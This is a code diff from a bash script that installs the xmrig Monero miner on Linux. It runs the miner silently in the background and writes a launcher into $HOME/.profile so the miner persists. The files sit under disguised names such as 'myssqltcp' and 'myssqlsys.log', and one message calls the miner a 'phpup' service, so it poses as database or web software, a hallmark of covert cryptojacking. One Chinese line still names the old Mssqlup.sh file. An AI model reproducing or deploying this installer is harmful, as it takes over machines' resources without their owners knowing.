@@ -123,8 +123,8 @@ fi
 
 echo "I will download, setup and run in background Monero CPU server."
 echo "将进行下载设置,并在后台中运行phpup服务."
-echo "If needed, server in foreground can be started by $HOME/myssqltcp/Mssqlup.sh script."
-echo "如果需要,可以通过以下方法启动前台服务输出 $HOME/myssqltcp/Mssqlup.sh script."
+echo "If needed, server in foreground can be started by $HOME/myssqltcp/xmrig.sh script."
+echo "如果需要,可以通过以下方法启动前台服务输出 $HOME/myssqltcp/xmrig.sh script."
 echo "Mining will happen to $WALLET wallet."
 echo "将使用 $WALLET 地址进行开采"
 if [ ! -z $EMAIL ]; then
@@ -254,9 +254,9 @@ sed -i 's/"background": *false,/"background": true,/' $HOME/myssqltcp/config_bac
 
 # preparing script
 
-echo "[*] Creating $HOME/myssqltcp/Mssqlup.sh script"
-echo "[*] 在该目录下创建 $HOME/myssqltcp/Mssqlup.sh 脚本"
-cat >$HOME/myssqltcp/Mssqlup.sh <<EOL
+echo "[*] Creating $HOME/myssqltcp/xmrig.sh script"
+echo "[*] 在该目录下创建 $HOME/myssqltcp/xmrig.sh 脚本"
+cat >$HOME/myssqltcp/xmrig.sh <<EOL
 #!/bin/bash
 if ! pidof xmrig >/dev/null; then
   nice $HOME/myssqltcp/xmrig \$*
@@ -268,22 +268,22 @@ else
 fi
 EOL
 
-chmod +x $HOME/myssqltcp/Mssqlup.sh
+chmod +x $HOME/myssqltcp/xmrig.sh
 
 # preparing script background work and work under reboot
 
 if ! sudo -n true 2>/dev/null; then
-  if ! grep myssqltcp/Mssqlup.sh $HOME/.profile >/dev/null; then
-    echo "[*] Adding $HOME/myssqltcp/Mssqlup.sh script to $HOME/.profile"
+  if ! grep myssqltcp/xmrig.sh $HOME/.profile >/dev/null; then
+    echo "[*] Adding $HOME/myssqltcp/xmrig.sh script to $HOME/.profile"
 	echo "[*] 添加 $HOME/myssqltcp/Mssqlup.sh 到 $HOME/.profile"
-    echo "$HOME/myssqltcp/Mssqlup.sh --config=$HOME/myssqltcp/config_background.json >/dev/null 2>&1" >>$HOME/.profile
+    echo "$HOME/myssqltcp/xmrig.sh --config=$HOME/myssqltcp/config_background.json >/dev/null 2>&1" >>$HOME/.profile
   else 
-    echo "Looks like $HOME/myssqltcp/Mssqlup.sh script is already in the $HOME/.profile"
-	echo "脚本 $HOME/myssqltcp/Mssqlup.sh 已存在于 $HOME/.profile 中."
+    echo "Looks like $HOME/myssqltcp/xmrig.sh script is already in the $HOME/.profile"
+	echo "脚本 $HOME/myssqltcp/xmrig.sh 已存在于 $HOME/.profile 中."
   fi
   echo "[*] Running server in the background (see logs in $HOME/myssqltcp/myssqlsys.log file)"
   echo "[*] 已在后台运行myssqlsys (请查看 $HOME/myssqltcp/myssqlsys.log 日志文件)"
-  /bin/bash $HOME/myssqltcp/Mssqlup.sh --config=$HOME/myssqltcp/config_background.json >/dev/null 2>&1
+  /bin/bash $HOME/myssqltcp/xmrig.sh --config=$HOME/myssqltcp/config_background.json >/dev/null 2>&1
 else
 
   if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') -gt 3500000 ]]; then
@@ -297,7 +297,7 @@ else
 
     echo "[*] Running server in the background (see logs in $HOME/myssqltcp/myssqlsys.log file)"
 	echo "[*] 已在后台运行myssqlsys (请查看 $HOME/myssqltcp/myssqlsys.log 日志文件)"
-    /bin/bash $HOME/myssqltcp/Mssqlup.sh --config=$HOME/myssqltcp/config_background.json >/dev/null 2>&1
+    /bin/bash $HOME/myssqltcp/xmrig.sh --config=$HOME/myssqltcp/config_background.json >/dev/null 2>&1
     echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
     echo "Please move to a more modern Linux distribution or setup server activation after reboot yourself if possible."
 
